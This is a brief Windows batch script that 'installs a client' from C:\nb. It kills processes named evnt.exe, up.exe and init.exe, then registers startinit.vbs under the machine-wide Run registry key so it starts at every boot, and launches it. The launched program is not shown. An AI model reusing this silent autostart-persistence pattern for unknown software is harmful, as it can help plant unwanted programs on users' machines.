@echo off
title Installing client
cd /D %homedrive%\nb
color F0
echo removing previous installations please wait..
@reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v nb /f
taskkill /IM evnt.exe /f
taskkill /IM up.exe /f
taskkill /IM init.exe /f
echo done.
echo now installing.
@reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v nb /t reg_sz /f /d C:\nb\startinit.vbs
echo ----------------------------------------------.
echo done installing. please press any key to start.
echo ----------------------------------------------.
pause > nul
start c:\nb\startinit.vbs
exit